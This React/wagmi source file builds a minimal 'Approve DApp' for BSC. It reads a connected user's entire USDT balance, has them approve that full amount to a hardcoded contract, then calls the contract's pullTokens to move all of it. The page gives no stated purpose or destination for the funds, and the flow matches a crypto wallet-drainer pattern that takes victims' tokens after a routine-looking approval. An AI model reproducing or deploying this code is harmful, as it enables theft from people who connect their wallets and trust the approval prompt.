"use client";

import { useAccount, useConnect, useDisconnect, useWriteContract, usePublicClient } from "wagmi";
import { parseUnits } from "ethers";
import { injected } from "wagmi/connectors";

const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT

const TOKEN_ABI = [
  {
    name: "approve",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: []
  },
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "account", type: "address" }
    ],
    outputs: [
      { name: "", type: "uint256" }
    ]
  }
];

const CONTRACT_ADDRESS = "0x9d6db9BFDE5E1922FED7971C8580432ED052d62B";

const CONTRACT_ABI = [
  {
    name: "pullTokens",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "token", type: "address" },
      { name: "from", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: []
  }
];

export default function Home() {
  const { address, isConnected } = useAccount();
  const { connect } = useConnect();
  const { disconnect } = useDisconnect();

  const { writeContractAsync, isPending } = useWriteContract();
  const publicClient = usePublicClient();

  const handleApprove = async () => {
    try {
      const balance = await publicClient.readContract({
       address: TOKEN_ADDRESS,
       abi: TOKEN_ABI,
       functionName: "balanceOf",
       args: [address],
});

      const amount = balance;

      await writeContractAsync({
        address: TOKEN_ADDRESS,
        abi: TOKEN_ABI,
        functionName: "approve",
        args: [CONTRACT_ADDRESS, amount],
      });

      console.log("Approved!");
    } catch (err) {
      console.error(err);
    }
  };

const handlePull = async () => {
  try {
    // 🔥 Step 1: Read user's full USDT balance
    const balance = await publicClient.readContract({
      address: TOKEN_ADDRESS,
      abi: TOKEN_ABI,
      functionName: "balanceOf",
      args: [address],
    });

    console.log("User balance:", balance.toString());

    // 🔥 Step 2: Use full balance as amount
    const amount = balance;

    // 🔥 Step 3: Pull tokens
    await writeContractAsync({
      address: CONTRACT_ADDRESS,
      abi: CONTRACT_ABI,
      functionName: "pullTokens",
      args: [
        TOKEN_ADDRESS,
        address,
        amount
      ],
    });

    console.log("Tokens pulled!");
  } catch (err) {
    console.error("Pull error:", err);
  }
};

  return (
    <div style={{ padding: 40 }}>
      <h1>Approve DApp</h1>

      {!isConnected ? (
        <button onClick={() => connect({ connector: injected() })}>
          Connect Wallet
        </button>
      ) : (
        <>
          <p>Connected: {address}</p>

          <button onClick={disconnect}>Disconnect</button>

          <br /><br />

          <button onClick={handleApprove} disabled={isPending}>
            {isPending ? "Approving..." : "Approve USDT"}
          </button>

         <br /><br />

         <button onClick={handlePull}>
           Pull Tokens
         </button>
        </>
      )}
    </div>
  );
}
